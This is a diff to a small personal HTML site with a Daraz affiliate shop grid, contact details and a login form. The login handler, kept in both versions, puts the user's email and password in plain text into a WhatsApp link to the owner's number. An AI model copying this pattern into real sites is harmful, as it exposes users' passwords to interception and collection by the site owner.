@@ -31,7 +31,7 @@
 
         .container {
             max-width: 1200px;
-            width: 90%;
+            width: 95%;
             margin: 0 auto;
         }
 
@@ -50,18 +50,14 @@
             color: #fff;
         }
 
-        .logo span {
-            color: #ff7200;
-        }
+        .logo span { color: #ff7200; }
 
         .menu ul {
             display: flex;
             list-style: none;
         }
 
-        .menu ul li {
-            margin-left: 20px;
-        }
+        .menu ul li { margin-left: 20px; }
 
         .menu ul li a {
             text-decoration: none;
@@ -73,9 +69,7 @@
             cursor: pointer;
         }
 
-        .menu ul li a:hover, .active-tab {
-            color: #ff7200 !important;
-        }
+        .menu ul li a:hover, .active-tab { color: #ff7200 !important; }
 
         .search {
             display: flex;
@@ -109,27 +103,21 @@
             justify-content: space-between;
             align-items: center;
             min-height: 80vh;
-            padding: 50px 0;
-            gap: 40px;
+            padding: 40px 0;
+            gap: 30px;
         }
 
-        #home {
-            display: flex; 
-        }
+        #home { display: flex; }
 
-        .text {
-            flex: 1;
-        }
+        .text { flex: 1; }
 
         .text h1 {
-            font-size: 65px;
+            font-size: 60px;
             line-height: 1.1;
             margin-bottom: 20px;
         }
 
-        .text span {
-            color: #ff7200;
-        }
+        .text span { color: #ff7200; }
 
         .text p {
             font-size: 18px;
@@ -158,49 +146,49 @@
         /* --- SHOP STYLES --- */
         .shop-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 25px;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 20px;
             width: 100%;
-            margin-top: 30px;
+            margin-top: 20px;
         }
 
         .product-card {
             background: rgba(0, 0, 0, 0.85);
             border: 1px solid rgba(255, 114, 0, 0.3);
-            border-radius: 15px;
-            padding: 20px;
+            border-radius: 12px;
+            padding: 15px;
             text-align: center;
             transition: 0.4s;
             display: flex;
             flex-direction: column;
-            justify-content: space-between;
         }
 
         .product-card:hover {
             border-color: #ff7200;
-            transform: translateY(-10px);
-            box-shadow: 0 10px 20px rgba(255, 114, 0, 0.2);
+            transform: translateY(-5px);
         }
 
         .product-card img {
             width: 100%;
-            height: 200px;
+            height: 180px;
             object-fit: cover;
-            border-radius: 10px;
-            margin-bottom: 15px;
+            border-radius: 8px;
+            margin-bottom: 12px;
         }
 
         .product-card h3 {
-            font-size: 15px;
-            margin-bottom: 15px;
+            font-size: 14px;
+            margin-bottom: 12px;
             color: #fff;
-            height: auto; /* تغییر از 60px به خودکار */
-            overflow: visible; /* تغییر برای نمایش تمام متن */
+            height: auto; 
+            overflow: visible; 
             line-height: 1.4;
+            text-align: left;
+            font-weight: normal;
         }
 
         .product-card .price {
-            font-size: 20px;
+            font-size: 18px;
             color: #ff7200;
             font-weight: bold;
             margin-bottom: 15px;
@@ -215,32 +203,26 @@
             text-decoration: none;
             border-radius: 5px;
             font-weight: bold;
-            transition: 0.3s;
-        }
-
-        .buy-btn:hover {
-            background: #fff;
-            color: #ff7200;
+            margin-top: auto;
         }
 
         /* --- LOGIN FORM --- */
         .form {
             width: 350px;
             background: rgba(0,0,0,0.85);
-            padding: 40px;
+            padding: 30px;
             border-radius: 15px;
             border: 1px solid rgba(255, 114, 0, 0.4);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
 
         .form h2 {
             text-align: center;
             color: #ff7200;
             background: #fff;
-            padding: 10px;
+            padding: 8px;
             border-radius: 5px;
-            margin-bottom: 30px;
-            font-size: 22px;
+            margin-bottom: 25px;
+            font-size: 20px;
         }
 
         .form input {
@@ -249,10 +231,9 @@
             border: none;
             border-bottom: 1px solid #ff7200;
             color: #fff;
-            padding: 12px 5px;
-            margin-bottom: 20px;
+            padding: 10px 5px;
+            margin-bottom: 15px;
             outline: none;
-            font-size: 16px;
         }
 
         .form button {
@@ -261,31 +242,28 @@
             border: none;
             padding: 12px;
             color: #000;
-            font-size: 18px;
             font-weight: bold;
             border-radius: 5px;
             cursor: pointer;
-            transition: 0.3s;
         }
 
-        .form button:hover {
-            background: #fff;
-            color: #ff7200;
-        }
-
+        /* --- MOBILE RESPONSIVE --- */
         @media (max-width: 992px) {
-            .navbar { flex-direction: column; gap: 20px; }
-            .menu ul { justify-content: center; padding: 0; }
+            .navbar { flex-direction: column; gap: 15px; }
+            .menu ul { flex-wrap: wrap; justify-content: center; }
             .menu ul li { margin: 5px 10px; }
-            .page-content { flex-direction: column; text-align: center; padding-top: 20px; }
-            .text h1 { font-size: 45px; }
-            .form { width: 100%; max-width: 400px; }
+            .page-content { flex-direction: column; text-align: center; }
+            .text h1 { font-size: 40px; }
+            .form { width: 100%; max-width: 400px; margin: 0 auto; }
         }
 
         @media (max-width: 600px) {
             .logo { font-size: 28px; }
-            .text h1 { font-size: 35px; }
+            .text h1 { font-size: 32px; }
             .text p { font-size: 15px; }
+            .shop-grid { grid-template-columns: 1fr; } /* */
+            .product-card img { height: 220px; }
+            .search input { width: 100px; }
         }
     </style>
 </head>
@@ -328,114 +306,80 @@
             </div>
         </div>
 
-        <!-- Section: SHOP (Affiliate Daraz) -->
+        <!-- Section: SHOP -->
         <div id="shop" class="page-content">
-            <div class="text" style="text-align: center;">
-                <h1>Our <span>Shop</span></h1>
-                <p>Best products from Daraz selected for you.</p>
-                
+            <div class="text" style="width: 100%;">
+                <h1 style="text-align: center;">Our <span>Shop</span></h1>
                 <div class="shop-grid">
                     <!-- Product 1 -->
                     <div class="product-card">
-                        <img src="https://i.postimg.cc/CL8n0KZZ/3e6991f682af03ca31c005e9b8a295e7.jpg" alt="Product Image">
-                        <h3> Korean watches for girls Ins Girls Alloy Ribbon Streamer Watch Female Accessories ladies watch Scrunchies Watch For Girls & Women | Gift for Girls Ladies Watches
-Product Price:  Rs.399
-Discount Price:  Rs.299</h3>
+                        <img src="https://i.postimg.cc/CL8n0KZZ/3e6991f682af03ca31c005e9b8a295e7.jpg" alt="Product">
+                        <h3>Korean watches for girls Ins Girls Alloy Ribbon Streamer Watch Female Accessories ladies watch Scrunchies Watch For Girls & Women | Gift for Girls Ladies Watches<br>Original Price: Rs.399</h3>
                         <span class="price">Rs. 299</span>
                         <a href="https://s.daraz.pk/s.1nBk6?cc" target="_blank" class="buy-btn">BUY NOW</a>
                     </div>
-
                     <!-- Product 2 -->
                     <div class="product-card">
-                        <img src="https://i.postimg.cc/T2NnfwRY/65b3ce07491a68bc132d8e692d40fb85.jpg" alt="Product Image">
-                        <h3>  NESTLE NIDO Growing up Formula 1+ Powder 900gm
-Product Price:  Rs.2,700
-Discount Price:  Rs.2,685</h3>
+                        <img src="https://i.postimg.cc/T2NnfwRY/65b3ce07491a68bc132d8e692d40fb85.jpg" alt="Product">
+                        <h3>NESTLE NIDO Growing up Formula 1+ Powder 900gm<br>Original Price: Rs.2,700</h3>
                         <span class="price">Rs. 2,685</span>
                         <a href="https://s.daraz.pk/s.1nz7N?cc" target="_blank" class="buy-btn">BUY NOW</a>
                     </div>
-
                     <!-- Product 3 -->
                     <div class="product-card">
-                        <img src="https://i.postimg.cc/xCCy3b0R/6107cc4536793b6a16f398df3ab768b0.jpg" alt="Product Image">
-                        <h3>Palmolive Naturals Moisturizing Glow Bar Soap 130g
-Product Price:  Rs.148
-Discount Price:  Rs.132</h3>
+                        <img src="https://i.postimg.cc/xCCy3b0R/6107cc4536793b6a16f398df3ab768b0.jpg" alt="Product">
+                        <h3>Palmolive Naturals Moisturizing Glow Bar Soap 130g<br>Original Price: Rs.148</h3>
                         <span class="price">Rs. 132</span>
                         <a href="https://s.daraz.pk/s.1nzK4?cc" target="_blank" class="buy-btn">BUY NOW</a>
                     </div>
-
                     <!-- Product 4 -->
                     <div class="product-card">
-                        <img src="https://i.postimg.cc/HLWQT77y/66ba3edb6537c7f2a47452bb986d53d7.jpg" alt="Product Image">
-                        <h3>  L'Oreal Paris - LOreal Elvive 6 Oil Nourish Shampoo 360 ML For Dull & Dry Hair
-Product Price:  Rs.930
-Discount Price:  Rs.727</h3>
+                        <img src="https://i.postimg.cc/HLWQT77y/66ba3edb6537c7f2a47452bb986d53d7.jpg" alt="Product">
+                        <h3>L'Oreal Paris - LOreal Elvive 6 Oil Nourish Shampoo 360 ML For Dull & Dry Hair<br>Original Price: Rs.930</h3>
                         <span class="price">Rs. 727</span>
                         <a href="https://s.daraz.pk/s.1nzkL?cc" target="_blank" class="buy-btn">BUY NOW</a>
                     </div>
-                   
                     <!-- Product 5 -->
                     <div class="product-card">
-                        <img src="https://i.postimg.cc/bw8fmqKN/c5953cf1ea7549b070dfcd61dd9f261c.jpg" alt="Product Image">
-                        <h3> One Step 3 in 1 Hair Dryer, hair straightner, hair curler And Volumizer for ladies - Hair Straightening Brush for women - Hair Styler - Hot Air Brush
-Product Price:  Rs.7,500
-Discount Price:  Rs.1,849
-</h3>
+                        <img src="https://i.postimg.cc/bw8fmqKN/c5953cf1ea7549b070dfcd61dd9f261c.jpg" alt="Product">
+                        <h3>One Step 3 in 1 Hair Dryer, hair straightner, hair curler and Volumizer<br>Original Price: Rs.7,500</h3>
                         <span class="price">Rs. 1,849</span>
                         <a href="https://s.daraz.pk/s.1nAoR?cc" target="_blank" class="buy-btn">BUY NOW</a>
                     </div>
-
                     <!-- Product 6 -->
                     <div class="product-card">
-                        <img src="https://i.postimg.cc/tC8YJnZN/b3af1348df2133ea3236b7c61b485b3f.jpg" alt="Product Image">
-                        <h3> T9 Vintage Hair Trimmer For Men | T9 Rechargeable Shaver Machine For Men| Professional Hair Trimming Machine | Hair Trimmer and Shaver For Boys
-Product Price:  Rs.1,600
-Discount Price:  Rs.785</h3>
+                        <img src="https://i.postimg.cc/tC8YJnZN/b3af1348df2133ea3236b7c61b485b3f.jpg" alt="Product">
+                        <h3>T9 Vintage Hair Trimmer For Men | Rechargeable Shaver Machine<br>Original Price: Rs.1,600</h3>
                         <span class="price">Rs. 785</span>
                         <a href="https://s.daraz.pk/s.1nAsB?cc" target="_blank" class="buy-btn">BUY NOW</a>
                     </div>
-                    
-                                        <!-- Product 7 -->
+                    <!-- Product 7 -->
                     <div class="product-card">
-                        <img src="https://i.postimg.cc/TPKLC8y7/057bc6b02192c033c96299b865c195fe-png.jpg" alt="Product Image">
-                        <h3> Dove Hairfall Rescue Shampoo 360ML
-Product Price:  Rs.870
-Discount Price:  Rs.700</h3>
+                        <img src="https://i.postimg.cc/TPKLC8y7/057bc6b02192c033c96299b865c195fe-png.jpg" alt="Product">
+                        <h3>Dove Hairfall Rescue Shampoo 360ML<br>Original Price: Rs.870</h3>
                         <span class="price">Rs. 700</span>
-                        <a href="https://s.daraz.pk/s.1Ma3I?cc" class="buy-btn">BUY NOW</a>
+                        <a href="https://s.daraz.pk/s.1Ma3I?cc" target="_blank" class="buy-btn">BUY NOW</a>
                     </div>
-                 
-                                     <!-- Product 8 -->
+                    <!-- Product 8 -->
                     <div class="product-card">
-                        <img src="https://i.postimg.cc/sDxFcLkD/d628491f2b37124b2302086634839f13-png-(1).jpg" alt="Product Image">
-                        <h3>I found this great deal on Daraz! Check it out! 
-Product Name:  Samsung Galaxy A07 4GB+64GB - PTA APPROVED
-Product Price:  Rs.32,500
-Discount Price:  Rs.25,497</h3>
+                        <img src="https://i.postimg.cc/sDxFcLkD/d628491f2b37124b2302086634839f13-png-(1).jpg" alt="Product">
+                        <h3>Samsung Galaxy A07 4GB+64GB - PTA APPROVED<br>Original Price: Rs.32,500</h3>
                         <span class="price">Rs. 25,497</span>
                         <a href="https://s.daraz.pk/s.1MeEa?cc" target="_blank" class="buy-btn">BUY NOW</a>
-                    </div>       
-                    
-                                                            <!-- Product 9 -->
+                    </div>
+                    <!-- Product 9 -->
                     <div class="product-card">
-                        <img src="https://i.postimg.cc/h4kDXczR/f543397400e27037072d3a5c38b65662-png.jpg" alt="Product Image">
-                        <h3> Jenpharm - Dermive Oil Free Moisturizer - 100ml | For Men & Women
-Product Price:  Rs.1,098
-Discount Price:  Rs.966</h3>
+                        <img src="https://i.postimg.cc/h4kDXczR/f543397400e27037072d3a5c38b65662-png.jpg" alt="Product">
+                        <h3>Jenpharm - Dermive Oil Free Moisturizer - 100ml<br>Original Price: Rs.1,098</h3>
                         <span class="price">Rs. 966</span>
-                        <a href="https://s.daraz.pk/s.1MV4h?cc" class="buy-btn">BUY NOW</a>
+                        <a href="https://s.daraz.pk/s.1MV4h?cc" target="_blank" class="buy-btn">BUY NOW</a>
                     </div>
-                    
-                                                            <!-- Product 10 -->
+                    <!-- Product 10 -->
                     <div class="product-card">
-                        <img src="https://i.postimg.cc/dV8LsD46/64d3942abe96df68c1119c0838e72a17-png.jpg" alt="Product Image">
-                        <h3> Pond's Super Light Gel 50ML
-Product Price:  Rs.999
-Discount Price:  Rs.797</h3>
+                        <img src="https://i.postimg.cc/dV8LsD46/64d3942abe96df68c1119c0838e72a17-png.jpg" alt="Product">
+                        <h3>Pond's Super Light Gel 50ML<br>Original Price: Rs.999</h3>
                         <span class="price">Rs. 797</span>
-                        <a href="https://s.daraz.pk/s.1MVrB?cc" class="buy-btn">BUY NOW</a>
-                    </div>
+                        <a href="https://s.daraz.pk/s.1MVrB?cc" target="_blank" class="buy-btn">BUY NOW</a>
                     </div>
                 </div>
             </div>
@@ -445,7 +389,7 @@ Discount Price:  Rs.797</h3>
         <div id="about" class="page-content">
             <div class="text">
                 <h1>About <span>Mahmood</span></h1>
-                <p>We are a team of expert developers and designers dedicated to teaching and building professional digital solutions for clients worldwide.</p>
+                <p>We are a team of expert developers and designers dedicated to teaching and building professional digital solutions.</p>
             </div>
         </div>
 
@@ -453,7 +397,7 @@ Discount Price:  Rs.797</h3>
         <div id="service" class="page-content">
             <div class="text">
                 <h1>Our <span>Services</span></h1>
-                <p>From UI/UX Design to Full-Stack Web Development and SEO, we cover everything you need to succeed in the digital era.</p>
+                <p>From UI/UX Design to Full-Stack Web Development and SEO.</p>
             </div>
         </div>
 
@@ -461,7 +405,7 @@ Discount Price:  Rs.797</h3>
         <div id="design" class="page-content">
             <div class="text">
                 <h1>Modern <span>Design</span></h1>
-                <p>Explore our clean, minimal, and high-impact designs tailored to provide the best user experience on all devices.</p>
+                <p>Explore our clean, minimal, and high-impact designs.</p>
             </div>
         </div>
 
@@ -469,7 +413,7 @@ Discount Price:  Rs.797</h3>
         <div id="contact" class="page-content">
             <div class="text">
                 <h1>Contact <span>Us</span></h1>
-                <p>Email: mahmafirst@gmail.com <br> WhatsApp: +923437996268 <br> Feel free to reach out anytime!</p>
+                <p>Email: mahmafirst@gmail.com <br> WhatsApp: +923437996268</p>
             </div>
         </div>
 
@@ -492,51 +436,31 @@ Discount Price:  Rs.797</h3>
 
     function handleSearch() {
         var query = document.getElementById("searchInput").value.toLowerCase().trim();
-        if (query === "") {
-            alert("Please type something to search.");
-            return;
-        }
-
+        if (query === "") { alert("Please type something."); return; }
         var sections = ["home", "shop", "about", "service", "design", "contact"];
         var found = false;
-
         for (var i = 0; i < sections.length; i++) {
             var sectionId = sections[i];
             var sectionText = document.getElementById(sectionId).innerText.toLowerCase();
-
             if (sectionText.includes(query)) {
-                var targetLink = document.getElementById("link-" + sectionId);
-                openTab(sectionId, targetLink);
+                openTab(sectionId, document.getElementById("link-" + sectionId));
                 found = true;
                 break;
             }
         }
-
-        if (!found) {
-            alert("No results found for: " + query);
-        }
+        if (!found) alert("No results found.");
     }
 
     function handleLogin() {
-        var userEmail = document.getElementById("emailInput").value.trim();
-        var userPass = document.getElementById("passInput").value.trim();
-
-        if (userEmail === "" || userPass === "") {
-            alert("Error: Please enter both Email and Password!");
-            return;
-        }
-
-        var myNumber = "923437996268";
-        var message = "New User Login Attempt!%0AEmail: " + userEmail + "%0APassword: " + userPass;
-
-        alert("Login Successful! Sending details to WhatsApp...");
-        window.open("https://wa.me/" + myNumber + "?text=" + message, "_blank");
+        var email = document.getElementById("emailInput").value.trim();
+        var pass = document.getElementById("passInput").value.trim();
+        if (email === "" || pass === "") { alert("Enter Email and Password!"); return; }
+        var message = "New User Login Attempt!%0AEmail: " + email + "%0APassword: " + pass;
+        window.open("https://wa.me/923437996268?text=" + message, "_blank");
     }
 
     document.getElementById("searchInput").addEventListener("keypress", function(event) {
-        if (event.key === "Enter") {
-            handleSearch();
-        }
+        if (event.key === "Enter") handleSearch();
     });
 </script>
 
